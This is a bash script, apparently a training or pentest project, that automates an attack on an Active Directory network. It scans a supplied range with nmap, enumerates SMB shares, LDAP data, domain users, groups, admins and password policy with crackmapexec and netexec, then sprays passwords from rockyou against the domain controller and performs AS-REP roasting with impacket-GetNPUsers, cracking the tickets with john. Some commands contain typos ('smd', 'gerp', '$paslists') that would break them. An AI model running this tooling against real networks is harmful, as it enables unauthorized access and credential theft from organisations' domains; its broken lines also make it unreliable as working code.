#!/bin/bash
# Define Color Variables
# Format: Escape_Code[Style_Code;Foreground_Color_Code
YELLOW='\e[1;33m'
CYAN='\e[1;36m'
ORANGE='\e[38;5;208m'
BGreen='\033[1;32m'
MAGENTA='\e[1;35m'
NC='\e[0m' # No Color (Reset)


function APP_CHECK()
{
sudo updatedb
	echo "______________________________________________"
	for TOOL in masscan nmap crackmapexec
	do 
	CHECK=$(command -v $TOOL)
	if [ -z "$CHECK" ] #-z acts as zero 
	then
	echo 'The following tool is not instualled:' $TOOL
	echo "_______________________________________"
	echo
	echo -e '${MAGENTA}----Start the installation----${NC}'
	echo
	echo "_______________________________________"
sudo apt-get install $TOOL &>/dev/null
	else
	echo 
	echo -e "${CYAN} - The following tool is instualled: ${NC}" $TOOL
	fi
	done 
}
APP_CHECK


function PREPARE()
{
	#Make sure to add comments
	echo "_______________________________________________________________"
	echo
	read -p " - Enter Network range for scanning: " netrange
	echo
	read -p " - Enter Domain Controller name: " domname
	echo
	#Tell the user to insert AD creds, if he dosent have, pressing skip will leave the varialbles empty
	read -p " - Enter AD username (press enter to skip): " aduser
	echo
	read -p " - Enter AD password (press enter to skip): " adpass
	sleep 2
	echo
	read -p " - Specify a name of a new folder to save all the data: " folder
	mkdir $folder
	
	#If the user press enter, the password list rock you will be saved in the variable
	echo
	read -p " - Specify the password list to use (press enter to default): " paslist
	if [ -z "$paslist" ]
	then
	paslist='/usr/share/wordlist/rockyou.txt'
	fi
}
PREPARE


function SCAN()
{
	echo "_______________________________________________________________"
	echo 
	echo -e "${ORANGE}____SCAN_____B for basic scan, I for intermediate, A for advanced_____${NC}"
	read scantype
	
	#The scan level will be determined by the user
	case $scantype in
	
	B|b) extra_flags=''
	;;
	
	I|i) extra_flags='-p-'
	;;
	
	A|a) extra_flags='-p- -sU'
	;;
	
	#You can add another option '*)' and this options will be executed when the user didnt choose anty of the scan options
	#If the user chose the *) option - the best way is to call the next sunction right away (this way the below nmap command will no be executed
	
	esac
	#scan the netrange varible with the extra flags if exists
	nmap $netrange -Pn $extra_flags > $folder/nmap_output.txt
}
SCAN


function BasicEnum()
{
	grep "report for" "$folder/nmap_output.txt" | awk '{print $NF}' > "$folder/live.ips"
	
	for ip in $(cat $folder/live.ips)
	do
	nmap $ip -Pn -sV > $folder/$ip
	done 
	
	DomainIP=$(grep -il 'kerberos' $folder/[0-9]* | awk -F '/' '{print $2}') #grep and list the name of matchin
	echo "The Domain IP is $DomainIP" 
	
	DHCPIP=$(nmap $DomainIP -sV --script=broadcast-dhcp-discover | grep "Server Identifier" | awk '{print $NF}')
	echo "the DHCP server IP is $DHCPIP" > $folder/dhcpip.txt
}



function InterEnum()
{

	nmap $DomainIP -sV --script=ldap-search,smb-shares > $folder/domain_extended_scan.txt
    nmap $DomainIP -sV --script=ms-sql-info,smb-os-discovery > $folder/domain_extended_scan_DO.txt
	
	#For loop to find devices with the following ports
	for port in 21 22 445 5985 389 3389
	do
	echo "The following IPs include the port $port on" | tee -a $folder/open_key_ports.txt #tee -a will display the data that was injected to the file
	grep -El '^$port/tcp[[:space:]]+open' $folder/[0-9]* | awk -F '/' '{print $2}' | tee -a $folder/open_key_ports.txt #we used chatgpt to get this filter
	echo '____________________________________________________' | tee -a $folder/open_key_ports.txt
	done
}



function AdvEnum()
{
	if [ -z "$aduser" ] #If the AD user variable that was entered is empty. You can check the AD pass as well
	then 
	echo "Cant continue, AD creds are missing"
	return 1
	
	else #If it is not empty, run all the commands
	crackmapexec smb $DomainIP -u $aduser -p $adpass --users | grep 'badpwdcount' | awk '{print $5}' | awk -F '/' '{print $2}' > $folder/adusers.txt
	crackmapexec smb $DomainIP -u $aduser -p $adpass --groups | grep -v "SMB" | grep -v "\\[" | awk '{print $5}' | sort -u > $folder/adgroups.txt #make sure to grep and awk the CME output, to get only the groups
	crackmapexec smb $DomainIP -u $aduser -p $adpass --shares | grep -E "READ|WRITE" | awk '{print $4}' | sort -u >  $folder/adshares.txt #make sure to gerp and awk the CME output, to get only the shares
	crackmapexec smb $DomainIP -u $aduser -p $adpass --pass-pol | grep -E "Minimum|Maximum|Lockout|Complexity" > $folder/adpasspolicy.txt #make sure to gerp and awk the CME output, to get only the pass-pol
	crackmapexec smb $DomainIP -u $aduser -p $adpass --groups 'Domain Admins' | grep -v "SMB" | awk '{print $5}' | grep -v "^$" > $folder/domain_admins.txt #display the admin users, use awk and grep also.
	
	#the following command are used with netexec to display disabled users an never expired accounts
	netexec ldap $DomainIP -u $aduser -p $adpass --query "(userAccountControl:1.2.840.113556.1.4.803:=2)" sAMAccountName > $folder/disabledusers.txt
	netexec ldap $DomainIP -u $aduser -p $adpass --query "(|(accountExpires=0)(accountExpires=9223372036854775807))" sAMAccountName > $folder/neverexpires.txt
	
	fi
}



function ENUM()
{
	echo
	echo -e "${ORANGE}_____ENUM_____B for Basic scan, I for Intermidate, A for Advanced_____${NC}"
	read enumtype
	
	#The scan level will be determined by the user
	case $enumtype in
	
	B|b) BasicEnum
	;;
	
	I|i) BasicEnum
		 InterEnum
	;;
	
	A|a) BasicEnum
		 InterEnum
		 AdvEnum
	;;
	
	esac
}	
ENUM



function EXPLOIT()
{
	echo
	echo -e "${ORANGE}_____EXPLOIT_____B for Basic scan, I for Intermidate, A for Advanced_____${NC}"
	read exploittype
	
	case $exploittype in 
	
	B|b) echo "Starting Basic Exploit"
	;;
	
	I|i)
		if [ -f $folder/adusers.txt ] 
		#if the users file exist, start the attack
		then
			crackmapexec smd $DomainIP -u $folder/adusers.txt -p $paslist -d $domname --continue-on-success | gerp '+' >> $folder/pass-attack_results.txt
		else
		echo "No User file was found"
		fi
		
	;;
	
	A|a)
		if [ -f $folder/adusers.txt ] 
		#if the users file exist, start the attack
		then
			crackmapexec smb $DomainIP -u $folder/adusers.txt -p $paslist -d $domname --continue-on-success | grep '+' >> $folder/pass-attack_results.txt
			#get the tickets of npusers, crack the tickts using john
			impacket-GetNPUsers $domname/ -usersfile $folder/adusers.txt -dc-ip $DomainIP > npusers_tickets.txt
			john npusers_tickets.txt --format=krb5asrep --wordlist=$paslists
			john npusers_tickets.txt --format=krb5asrep --show > cracked_npusers.txt
		else
			echo "No User file was found"
		fi

	;;
	    esac
	
			nmap $DomainIP -sV --script=vuln > $folder/domain-vulns.txt #this command will be executed in every stage	
}
EXPLOIT


function PDF()
{
	sudo apt-get install enscript -y
	enscript $folder/nmap_output.txt -p $folder/output
	ps2pdf $folder/output $folder/output.pdf
	echo "PDF file created named output.pdf in the $folder directory"
	rm $folder/output	
}
PDF
